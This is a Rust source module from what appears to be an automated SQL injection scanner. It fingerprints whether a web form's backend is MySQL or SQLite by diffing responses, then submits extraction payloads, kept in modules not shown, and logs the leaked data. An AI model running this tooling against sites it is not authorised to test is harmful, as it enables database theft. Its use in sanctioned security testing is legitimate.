mod mysql;
mod sqlite;

use crate::site::{Db, Site};
use anyhow::Result;
use difflib::unified_diff;
use log2::{debug, error, info, trace};

static DETECTIONS: &[(Db, &[&str])] = &[
    (Db::Mysql, mysql::DETECTIONS),
    (Db::Sqlite, sqlite::DETECTIONS),
];

fn diff(original: &str, response: &str) -> Vec<String> {
    let original = original.lines().collect::<Vec<_>>();
    let response = response.lines().collect::<Vec<_>>();
    let diff = unified_diff(&original, &response, "original", "response", "", "", 0);
    diff.iter()
        .skip(3)
        .filter(|l| l.starts_with('+'))
        .cloned()
        .collect()
}

pub fn test(site: &mut Site) -> Result<()> {
    // just a random string to not match anything
    let query = "5b285d5e-5a26-4928-b429-6e17a863663b".to_string();
    let empty = site.submit(&query)?;
    'outer: for (db, prompts) in DETECTIONS {
        for prompt in *prompts {
            trace!("testing {db}: `{prompt}`");
            let response = site.submit(query.clone() + prompt)?;
            if response != empty {
                let diff = diff(&empty, &response);
                if !diff.is_empty() {
                    debug!(
                        "found a difference between empty query and `{prompt}`, the form is probably injectable."
                    );
                    if !diff.iter().any(|l| l.to_lowercase().contains("error")) {
                        site.db = *db;
                        debug!("no error message, assuming {db}");
                        break 'outer;
                    }
                }
            }
        }
    }
    match site.db {
        Db::Unknown => {
            error!("couldn't find a exploit for this form");
            return Ok(());
        }
        _ => info!("detected injectable database: {:?}", site.db),
    };
    info!("trying to extract informations");
    let prompts = match site.db {
        Db::Mysql => mysql::PROMPTS,
        Db::Sqlite => sqlite::PROMPTS,
        _ => unreachable!(),
    };
    for prompt in prompts {
        trace!("testing `{prompt}`");
        let response = site.submit(query.clone() + prompt)?;
        if response != empty {
            let diff = diff(&empty, &response);
            if !diff.is_empty() && !diff.iter().any(|l| l.to_lowercase().contains("error")) {
                // let text = august::convert(&diff.join("\n"), usize::MAX);
                let text = nanohtml2text::html2text(&diff.join("\n"));
                let text = text
                    .trim_matches(['\n', '\r', ' ', '+'])
                    .replace("\n\r\n", "\n");
                info!("`{prompt}`:\n{}", text);
            }
        }
    }
    Ok(())
}
